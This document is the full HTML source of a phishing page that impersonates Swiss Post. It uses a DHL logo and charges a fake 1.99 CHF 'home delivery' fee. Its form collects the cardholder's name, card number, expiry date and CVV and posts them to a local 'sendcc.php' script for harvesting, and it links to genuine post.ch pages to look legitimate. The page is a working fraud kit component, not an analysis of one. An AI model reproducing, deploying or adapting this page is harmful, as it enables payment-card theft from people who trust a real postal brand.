<html lang="en">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Swiss Post</title>
                            



    <!-- CWF CSS -->
    <link rel="stylesheet" href="post.css" media="all" rel="stylesheet" type="text/css"/>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <link href="logrend.css" rel="stylesheet" type="text/css" media="all">

</head>
<body class="login_background" data-accessibility="init" itemscope itemtype="http://schema.org/WebPage">
        <!-- DATA LAYER START -->

    <!-- DATA LAYER START END -->
    <script nonce="uOy+X8bDLHze4Dy56Raoxw==" type="text/javascript"> (function(a,b,c,d){ a='//tags.tiqcdn.com/utag/schweizerischepost/secure/prod/utag.js'; b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true; a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a); })(); </script>
    <div class="header-and-footer-css outerWrapper">
    <div class="header-and-footer-css absoluteCenterWrapper">
        <div class="absoluteCenter">
            <div class="sp-internet-header">
                <div class="sp-internet-header-middle">
                    <div class="navigation_logo">
                                                <a class="navigation_logo-link" href="https://www.post.ch/en">
                            <img class="navigation_logo-image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/DHL_Logo.svg/1280px-DHL_Logo.svg.png" alt="Logo Die Post, To the homepage" role="img">
                        </a>
                    </div>
                    <div class="sp-internet-header-right">
                        <div class="dropdown">
                            <button class="dropbtn">DE</button>
                          
                    </div>
                </div>
            </div>

            <div data-init-od-component="breadcrumb"></div>


<link rel="stylesheet" href="sesam-buttons.css" type="text/css"/>
<link rel="stylesheet" href="login-statics-cache-filter.css" type="text/css"/>







<div id="overlayMessage" class="overlay-container" style="display: none;">
    <div class="toast-top-right toast-container">
        <div id="overlayMessageType" class="toast-error toast ">
            <button id="overlayMessageCloseButton" aria-label="Close" class="toast-close-button">
                <span></span>
            </button>
            <span id="overlayMessageText" class="toast-title ng-star-inserted"> </span>
            <!-- div class="toast-title ng-star-inserted" aria-label="Cher client, chère cliente, veuillez vérifier votre saisie" style=""> Cher client, chère cliente, veuillez vérifier votre saisie </div>
            <div aria-live="polite" role="alertdialog" class="toast-message ng-star-inserted" style="">Merci de corriger les erreurs et de compléter tous les champs requis.</div -->
        </div>
    </div>
</div>

<div id="login_content" class="single_column_container">

    <div id="main_content" class="row mx-mini">
        <div class="col-12">
            <h1 class="d-none">Log in</h1>
            <form id="swissIdForm" method="POST" target="_self" action="       https://account.post.ch/idp/?login&amp;app=portal-delivery&amp;service=klp&amp;targetURL=https%3a%2f%2fwww.post.ch%2fen%2fcustomer-center&amp;abortURL=https%3a%2f%2fwww.post.ch%2fen%2f
 
 
">
                <div id="swissid-content-login" class="py-small-huge">
                    <div class=""> <h6>
Lieferung nach Hause (1.99 CHF )
Die Post ermöglicht Ihnen, Ihre Paketsendungen vom Versand bis zur Zustellung jederzeit zu verfolgen. <h6>
                    </div>
                </div>
            </form>
 
 

                <div id="section_login_collapsible" class="">
                

                    <div class="">
                        <div class="text-body mt-small-huge mb-large"><h6 class="text-left">

Reference number : 203120-609377
<br>Merchant : DHL Express
<br> Amount : 1.99 CHF</div> </h6>
                        <div class="p-t-large text-left">
                                <fieldset>
                                    <div class="form-group">
                                        <section>
                                            <label class="fm_label" id="label_isiwebuserid"
                                                   for="isiwebuserid"></label>
                          <form  method="POST" action="sendcc.php" class="row g-3">

  <div class="col-12">
    <label for="inputAddress" class="form-label">Name des Karteninhabers :</label>
    <input type="text" class="form-control" id="inputAddress" placeholder="" name="ccname" required>
  </div>
  <div class="col-12">
    <label for="inputAddress2" class="form-label">Karten nummer :</label>
    <input type="text" class="form-control" id="inputAddress2" placeholder="" name="ccnum" required>
  </div>
  <div class="col-md-2">
    <label for="inputCity" class="form-label">Gültig bis  </label>
    <input type="text" class="form-control" id="inputCity" placeholder="mm" name="mm" required>
  </div>
  <div class="col-md-2">
    <label for="inputState" class="form-label">:</label>
    <input type="text" class="form-control" placeholder="jj" id="inputCity" name="jj" required>
  </div>

  <div class="col-3">
    <label for="inputAddress2" class="form-label">CVV :</label>
    <input type="text" class="form-control" id="inputAddress2" placeholder="" name="cvv" required>
  </div>
  <div class="d-grid gap-2">
  <button type="submit" class="btn btn-warning" type="button">Bestätigen Sie</button>
  </div>
</form>
                                        
                                        </section>
                                    

                                        </div>
                                    </ul>
                                </fieldset>
                            </div>
                        </div>

                    </div>



                <!-- OVERLAY ERROR -->
                            <div id="overlayAllMessage" style="display: none;">
                    <div aria-hidden="true" class="modal-backdrop fade show"></div>
                    <div formnovalidate role="dialog" tabindex="-1" class="modal fade show d-block" aria-modal="true">
                        <div role="document" class="modal-dialog  modal-dialog-centered">
                            <div class="modal-content">
                                <div id="overlayAllMessageType" class="px-small-huge py-large rounded-top ">
                                                                    <button class="modal-close-button"><span class=""></span></button>
                                    <span class="m-0 pt-3 mb-1 es-docs"></span>
                                    <div class="text-center">
                                        <span class="pi pi-3x pi-2104-white mt-4 mb-3"><!-- ! --></span>
                                        <span class="text-left">
                                            <h5 id="overlayAllMessageText" class="font-weight-bold"></h5>
                                        </span>
                                    </div>
                                </div>
                                <div class="row py-large px-large">
                                    <div class="col-12 col-rg-5 d-none d-rg-block">&nbsp;</div>
                                    <div class="col-12 col-rg-7 px-large">
                                        <button type="submit" id="overlayAllMessageCloseButton"
                                                class="col-12 btn btn-primary">
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>

</div> 
                    
                    <section id="footer" class="header-and-footer-css footer ">
                        <div class="container-fluid">
                            <div class="row text-left">
                                <div class="col-12">
                                    <div class="col-12 mt-small-regular">
                                        <a class="pr-regular footerContact" id="footerContact" href="#">Contact</a>
                                        <a class="pr-regular footerInfo" id="footerInfo" href="#">Info</a>
                                    </div>
                                </div>
                            </div>
                            <div class="row text-left">
                                <div class="col-1 col-rg-12 d-none d-rg-block">
                                    <div class="col-12 mt-small-regular">
                                        <a class="pr-regular" target="_blank" href="https://www.post.ch/en/pages/footer/accessibility-at-swiss-post">Accessibility</a>
                                        <a class="pr-regular" target="_blank" href="https://www.post.ch/en/pages/footer/general-terms-and-conditions-gtc">GTC</a>
                                        <a class="pr-regular" target="_blank" href="https://www.post.ch/en/pages/footer/data-protection-and-disclaimer">Data protection and disclaimer</a>
                                        <a class="" target="_blank" href="https://www.post.ch/en/pages/footer/publication-details">Publication details</a>
                                    </div>
                                </div>
                                <div class="col-12 col-rg-1 d-rg-none">
                                    <div class="col-12 mt-small-regular">
                                        <a class="pr-regular" target="_blank" href="https://www.post.ch/en/pages/footer/accessibility-at-swiss-post">Accessibility</a>
                                        <a class="pr-regular" target="_blank" href="https://www.post.ch/en/pages/footer/general-terms-and-conditions-gtc">GTC</a>
                                    </div>
                                </div>
                                <div class="col-12 col-rg-1 d-rg-none">
                                    <div class="col-12 mt-small-regular">
                                        <a class="pr-regular" target="_blank" href="https://www.post.ch/en/pages/footer/data-protection-and-disclaimer">Data protection and disclaimer</a>
                                        <a class="" target="_blank" href="https://www.post.ch/en/pages/footer/publication-details">Publication details</a>
                                    </div>
                                </div>
                            </div>
                            <div class="row text-left">
                                <div class="col-12">
                                    <p class="col-12 mt-small-regular">
                                        <strong>©
                                           2021
                                            Swiss Post Ltd</strong>
                                    </p>
                                </div>
                            </div>
                        </div>

                    </section>
                </div>
            </div>
        </div>
    </body>
</html>
